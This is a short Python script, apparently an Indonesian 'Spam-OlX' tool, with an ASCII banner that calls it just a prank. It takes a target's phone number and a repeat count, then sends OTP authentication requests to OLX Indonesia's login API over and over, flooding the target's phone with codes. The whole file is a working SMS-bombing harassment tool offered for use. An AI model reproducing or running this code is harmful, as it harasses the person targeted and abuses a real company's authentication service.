import requests, time,os
os.system("clear")

print ("""\033[1;36m
 ╭━┳━╭━╭━╮╮
 ┃   ┣▅╋▅┫┃           ==============
 ┃   ┃   ╰━━━━━━━╮    |$ Spam-OlX $|
 ╰┳╯            ◢▉◣   |== MrDseC ==|
  ┃             ▉▉▉   ==============
  ┃             ◥▉◤ BUAT PRANK DOANG YA
  ┃      ╭━┳━━━━╯
  ┣━━━━━━┫
 ╭╯　　　╰╮
""")
print ("\033[1;37mMASUKKAN NOMOR  \033[1;31mTARGET")
print ("\033[1;37mCONTOH  \033[1;31m0821xxxxxxxx")
num=input("\033[1;37mNomor Target :")
jum=int(input("\033[1;31mJumlah :"))

if num[0] == "0":
	num=num[1:]
elif num[0:2] == "62":
	num=num[2:]

print("\n[RESULT]")
for x in range(jum):
	req=requests.post("https://www.olx.co.id/api/auth/authenticate", json={"grantType":"phone","phone":f"+62{num}","language":"id"}).json()
	if req['status'] == 'PENDING':
		print(f"{x+1}.\033[1;36m Succes {num}")
	else:
		print(f"{x+1}.\033[1;31m Failed {num}")
	time.sleep(1.5)
